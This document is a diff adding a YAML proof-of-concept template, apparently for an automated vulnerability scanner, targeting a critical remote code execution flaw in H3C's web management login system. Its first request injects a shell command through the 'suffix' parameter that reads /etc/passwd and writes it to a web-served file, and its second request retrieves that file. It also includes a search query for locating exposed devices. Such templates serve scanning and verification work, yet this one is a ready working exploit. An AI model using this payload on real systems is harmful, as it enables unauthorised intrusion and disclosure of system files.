@@ -1,0 +1,19 @@
+id: poc-yaml-h3c-web-nals-submit-rce
+info:
+  name: H3C Web网管登录系统 submit 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Web网管登录系统
+  hunter: app.name=="H3C Web 网管"
+variables:
+  t1: random_int(1000,10000)
+requests:
+- method: GET
+  path: /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60cat%20/etc/passwd%60%20|tee%20/usr/local/webui/sslvpn/{{.t1}}.txt|ls
+  expression: status_code == 200 && contains(body,`"success":"wchat_logo"`) && contains(body,"logout.php")
+- method: GET
+  path: /sslvpn/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
